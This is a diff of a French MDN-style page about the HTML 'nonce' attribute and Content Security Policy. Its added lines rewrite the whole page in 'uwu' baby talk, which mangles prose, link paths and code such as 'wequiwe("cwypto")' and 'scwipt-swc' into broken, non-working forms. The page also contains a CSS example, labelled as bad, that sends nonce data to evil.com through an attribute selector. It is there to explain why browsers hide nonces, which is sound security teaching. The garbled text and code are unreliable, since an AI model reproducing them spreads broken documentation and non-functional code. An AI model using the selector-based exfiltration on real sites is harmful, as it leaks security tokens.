@@ -1,84 +1,84 @@
 ---
-title: nonce
-slug: Web/HTML/Global_attributes/nonce
+titwe: nyonce
+swug: web/htmw/gwobaw_attwibutes/nonce
 ---
 
-{{HTMLSidebar("Global_attributes")}}
+{{htmwsidebaw("gwobaw_attwibutes")}}
 
-L'[attribut universel](/fr/docs/Web/HTML/Global_attributes) **`nonce`** est un attribut de contenu qui définit un nonce cryptographique pouvant être utilisé par une [règle de sécurité du contenu (CSP)](/fr/docs/Web/HTTP/CSP) afin de déterminer si la récupération d'un élément sera autorisée ou non.
+w-w'[attwibut univewsew](/fw/docs/web/htmw/gwobaw_attwibutes) **`nonce`** e-est un a-attwibut de contenu q-qui définit u-un nyonce cwyptogwaphique p-pouvant êtwe u-utiwisé p-paw une [wègwe de sécuwité du contenu (csp)](/fw/docs/web/http/csp) afin de détewminew si w-wa wécupéwation d'un éwément sewa autowisée o-ou nyon.
 
-## Description
+## descwiption
 
-L'attribut `nonce` permet d'autoriser certains éléments spécifiques (comme un script ou un style donné) en évitant d'avoir à utiliser la directive [CSP](/fr/docs/Web/HTTP/CSP) `unsafe-inline` qui autoriserait _tous_ les scripts ou styles embarqués.
+w'attwibut `nonce` p-pewmet d'autowisew cewtains éwéments spécifiques (comme un scwipt o-ou un stywe donné) en évitant d-d'avoiw à u-utiwisew wa diwective [csp](/fw/docs/web/http/csp) `unsafe-inwine` qui autowisewait _tous_ wes scwipts ou stywes embawqués. nyaa~~
 
-> **Note :** `nonce` doit uniquement être utilisé pour les cas où il n'est pas possible de faire autrement que d'utiliser un script ou un style embarqué non sécurisé. Si vous n'avez pas besoin de `nonce`, il ne faut pas l'utiliser. Si votre script est statique, vous pouvez utiliser une empreinte (<i lang="en">hash</i>) CSP à la place (voir les notes d'utilisation sur [les scripts embarqués non sécurisés](/fr/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#scripts_embarqués_non_fiables).)
+> **note :** `nonce` d-doit uniquement êtwe utiwisé pouw wes cas où iw ny'est pas possibwe de faiwe a-autwement que d'utiwisew un scwipt o-ou un stywe e-embawqué nyon s-sécuwisé. UwU si v-vous ny'avez pas besoin de `nonce`, :3 iw nye faut p-pas w'utiwisew. (⑅˘꒳˘) si votwe scwipt est statique, (///ˬ///✿) vous p-pouvez utiwisew une empweinte (<i wang="en">hash</i>) csp à wa pwace (voiw wes nyotes d'utiwisation s-suw [wes scwipts embawqués n-nyon sécuwisés](/fw/docs/web/http/headews/content-secuwity-powicy/scwipt-swc#scwipts_embawqués_non_fiabwes).)
 >
-> Mieux vaut toujours exploiter les protections [CSP](/fr/docs/Web/HTTP/CSP) au maximum et donc éviter les nonces ou les scripts embarqués non sécurisés tant que possible.
+> m-mieux vaut t-toujouws expwoitew wes pwotections [csp](/fw/docs/web/http/csp) au maximum et donc évitew wes n-nyonces ou wes s-scwipts embawqués nyon sécuwisés t-tant que possibwe. ^^;;
 
-### Utiliser `non` pour autoriser un élément &lt;script&gt;
+### u-utiwisew `non` pouw a-autowisew un éwément &wt;scwipt&gt;
 
-Plusieurs étapes sont nécessaires afin d'utiliser un nonce pour autoriser un script embarqué.
+pwusieuws étapes s-sont nyécessaiwes afin d'utiwisew un n-nyonce pouw autowisew un scwipt e-embawqué.
 
-#### Générer une valeur
+#### généwew une v-vaweuw
 
-Sur le serveur web, générez une chaîne de caractères encodées en base64 à partir de 128 bits de données générés par un générateur de nombres aléatoires cryptographique. Les nonces doivent être générés différemment à chaque chargement de la page. En Node.js par exemple, on pourra écrire&nbsp;:
+suw we sewveuw w-web, >_< généwez une chaîne de cawactèwes encodées en base64 à pawtiw de 128 bits de données généwés p-paw un généwateuw d-de nyombwes awéatoiwes cwyptogwaphique. rawr x3 wes n-nyonces doivent êtwe g-généwés d-difféwemment à chaque chawgement de wa page. /(^•ω•^) en nyode.js paw e-exempwe, on pouwwa écwiwe&nbsp;:
 
 ```js
-const crypto = require("crypto");
-crypto.randomBytes(16).toString("base64");
-// '8IBTHwOdqNKAWeKl7plt8g=='
+const cwypto = wequiwe("cwypto");
+cwypto.wandombytes(16).tostwing("base64");
+// '8ibthwodqnkawekw7pwt8g=='
 ```
 
-#### Autoriser le script embarqué
+#### autowisew we scwipt e-embawqué
 
-Le nonce généré côté serveur peut ensuite être utilisé sur le script embarqué qu'on souhaite autoriser&nbsp;:
+we nyonce généwé c-côté sewveuw p-peut ensuite êtwe u-utiwisé suw we scwipt embawqué q-qu'on souhaite a-autowisew&nbsp;:
 
-```html
-<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
+```htmw
+<scwipt n-nyonce="8ibthwodqnkawekw7pwt8g==">
   …
-</script>
+</scwipt>
 ```
 
-#### Envoyer le nonce avec un en-tête CSP
+#### e-envoyew we nyonce avec un en-tête csp
 
-Enfin, il faut envoyer la valeur du nonce dans un en-tête [`Content-Security-Policy`](/fr/docs/Web/HTTP/Headers/Content-Security-Policy) en préfixant la chaîne de caractères avec `nonce-`&nbsp;:
+enfin, :3 i-iw faut envoyew w-wa vaweuw du n-nyonce dans un e-en-tête [`content-secuwity-powicy`](/fw/docs/web/http/headews/content-secuwity-powicy) e-en pwéfixant wa chaîne de cawactèwes avec `nonce-`&nbsp;:
 
 ```http
-Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
+c-content-secuwity-powicy: scwipt-swc 'nonce-8ibthwodqnkawekw7pwt8g=='
 ```
 
-### Masquage et accès au nonce
+### masquage et accès au nyonce
 
-Pour des raisons de sécurité, le contenu de l'attribut `nonce` est masqué (c'est une chaîne vide qui sera renvoyé).
+pouw des waisons de sécuwité, (ꈍᴗꈍ) w-we contenu de w'attwibut `nonce` est masqué (c'est une c-chaîne vide qui s-sewa wenvoyé). /(^•ω•^)
 
-```js example-bad
-script.getAttribute("nonce"); // renvoie la chaîne vide
+```js e-exampwe-bad
+scwipt.getattwibute("nonce"); // w-wenvoie wa chaîne vide
 ```
 
-La propriété [`nonce`](/fr/docs/Web/API/HTMLElement/nonce) est la seule façon d'accéder aux nonces&nbsp;:
+w-wa pwopwiété [`nonce`](/fw/docs/web/api/htmwewement/nonce) e-est wa seuwe façon d'accédew aux nonces&nbsp;:
 
-```js example-good
-script.nonce; // renvoie la valeur du nonce
+```js exampwe-good
+scwipt.nonce; // wenvoie wa v-vaweuw du nyonce
 ```
 
-Un tel masquage empêche des acteurs malveillants d'exfiltrer les données du nonce grâce à des mécanismes qui permettent d'accéder aux attributs comme&nbsp;:
+un tew masquage e-empêche des acteuws mawveiwwants d-d'exfiwtwew w-wes données du nyonce gwâce à des mécanismes q-qui pewmettent d-d'accédew aux attwibuts comme&nbsp;:
 
-```css example-bad
-script[nonce~="peuimporte"] {
-  background: url("https://evil.com/nonce?peuimporte");
+```css e-exampwe-bad
+s-scwipt[nonce~="peuimpowte"] {
+  backgwound: uww("https://eviw.com/nonce?peuimpowte");
 }
 ```
 
-## Spécifications
+## spécifications
 
-{{Specifications}}
+{{specifications}}
 
-## Compatibilité des navigateurs
+## compatibiwité des nyavigateuws
 
-{{Compat}}
+{{compat}}
 
-## Voir aussi
+## v-voiw aussi
 
-- [`HTMLElement.nonce`](/fr/docs/Web/API/HTMLElement/nonce)
-- [Stratégie de sécurité du contenu (<i lang="en">Content Security Policy</i>) (CSP)](/fr/docs/Web/HTTP/CSP)
-- La directive CSP [`script-src`](/fr/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
+- [`htmwewement.nonce`](/fw/docs/web/api/htmwewement/nonce)
+- [stwatégie d-de s-sécuwité du contenu (<i wang="en">content s-secuwity p-powicy</i>) (csp)](/fw/docs/web/http/csp)
+- wa diwective csp [`scwipt-swc`](/fw/docs/web/http/headews/content-secuwity-powicy/scwipt-swc)
